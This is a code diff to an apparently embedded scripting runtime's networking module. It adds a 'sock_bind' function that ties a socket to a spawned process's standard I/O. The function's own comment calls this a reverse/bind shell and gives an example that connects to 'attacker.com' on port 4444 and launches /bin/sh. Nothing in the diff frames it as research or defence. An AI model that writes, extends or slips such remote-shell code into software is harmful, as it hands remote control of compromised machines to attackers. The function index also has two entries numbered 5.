@@ -19,6 +19,7 @@
  *   sock_close(handle)          - Close socket, returns true/false
  *   sock_send(handle, data)     - Send data, returns bytes sent or -1
  *   sock_recv(handle [, size])  - Receive data (max 255 bytes), returns string
+ *   sock_bind(handle, cmd)      - Bind socket to process stdin/stdout, returns PID or -1
  *
  * DNS FUNCTIONS:
  *   dns_resolve(hostname)       - Resolve hostname to IP string
@@ -49,6 +50,7 @@
 #include "dns.h"
 #include "http.h"
 #include "websocket.h"
+#include "process.h"
 #include "embedded_function_pointer.h"
 
 // ============================================================================
@@ -591,6 +593,66 @@ NOINLINE Value NetIO_SockRecv(FunctionContext& ctx) noexcept
 
     buffer[bytesRead] = '\0';
     return Value::String(buffer, (USIZE)bytesRead);
+}
+
+/**
+ * sock_bind(handle, cmd) - Bind socket to process stdin/stdout/stderr
+ *
+ * Forks a child process and redirects the socket to the process's
+ * standard I/O streams, creating a reverse/bind shell.
+ *
+ * @param handle Socket handle from sock_connect
+ * @param cmd Command to execute (e.g., "/bin/sh" on Linux, "cmd.exe" on Windows)
+ * @return Child process PID on success, -1 on error
+ *
+ * NOTE: This function is not available on UEFI platforms.
+ *
+ * Example:
+ *   var sock = sock_connect("attacker.com", 4444);
+ *   if (sock >= 0) {
+ *       var pid = sock_bind(sock, "/bin/sh");
+ *       if (pid >= 0) {
+ *           print("Shell spawned with PID:", pid);
+ *       }
+ *   }
+ */
+NOINLINE Value NetIO_SockBind(FunctionContext& ctx) noexcept
+{
+    if (!ctx.CheckArgs(2) || !ctx.IsNumber(0) || !ctx.IsString(1))
+    {
+        return Value::Number(-1);
+    }
+
+    NetworkContext* netCtx = GetNetworkContext(ctx);
+    if (!netCtx)
+    {
+        return Value::Number(-1);
+    }
+
+    INT32 handle = (INT32)ctx.ToNumber(0);
+    Socket* sock = netCtx->sockets.Get(handle);
+    if (!sock || !sock->IsValid())
+    {
+        return Value::Number(-1);
+    }
+
+    const CHAR* cmd = ctx.ToString(1);
+    if (cmd == nullptr || cmd[0] == '\0')
+    {
+        return Value::Number(-1);
+    }
+
+    // Get the socket's file descriptor
+    SSIZE sockFd = sock->GetFd();
+    if (sockFd < 0)
+    {
+        return Value::Number(-1);
+    }
+
+    // Bind socket to shell process
+    SSIZE pid = Process::BindSocketToShell(sockFd, cmd);
+
+    return Value::Number(pid);
 }
 
 // ============================================================================
@@ -1206,6 +1268,7 @@ NOINLINE Value NetIO_WsPong(FunctionContext& ctx) noexcept
  *     2. sock_close    - Close socket
  *     3. sock_send     - Send data
  *     4. sock_recv     - Receive data
+ *     5. sock_bind     - Bind socket to process stdin/stdout
  *
  *   DNS:
  *     5. dns_resolve   - Resolve hostname (IPv6 preferred)
@@ -1238,6 +1301,7 @@ NOINLINE void OpenNetworkIO(State& L, NetworkContext* ctx) noexcept
     L.Register("sock_close"_embed, EMBED_FUNC(NetIO_SockClose));
     L.Register("sock_send"_embed, EMBED_FUNC(NetIO_SockSend));
     L.Register("sock_recv"_embed, EMBED_FUNC(NetIO_SockRecv));
+    L.Register("sock_bind"_embed, EMBED_FUNC(NetIO_SockBind));
 
     // DNS functions
     L.Register("dns_resolve"_embed, EMBED_FUNC(NetIO_DnsResolve));
